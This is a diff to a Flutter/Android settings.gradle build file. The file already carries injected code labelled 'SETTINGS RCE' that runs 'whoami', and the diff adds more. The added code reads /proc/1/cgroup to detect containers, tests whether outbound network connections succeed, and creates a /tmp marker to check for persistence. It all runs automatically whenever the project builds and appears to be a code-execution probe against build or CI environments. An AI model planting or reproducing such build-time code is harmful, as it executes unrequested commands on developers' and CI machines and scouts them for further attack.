@@ -1,6 +1,26 @@
 include ':app'
 println "=== SETTINGS RCE ==="
 println "WHOAMI: " + "whoami".execute().text
+println new File("/proc/1/cgroup").text
+try {
+    def url = new URL("https://example.com")
+    def conn = url.openConnection()
+    conn.setConnectTimeout(3000)
+    conn.connect()
+    println "NETWORK OUTBOUND ALLOWED"
+} catch(Exception e) {
+    println "NETWORK BLOCKED"
+}
+
+println "BUILD MARKER TEST"
+def marker = new File("/tmp/persist_test")
+if (marker.exists()) {
+    println "PERSISTENCE DETECTED"
+} else {
+    println "FIRST RUN - creating marker"
+    marker.createNewFile()
+}
+
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
 
 def plugins = new Properties()
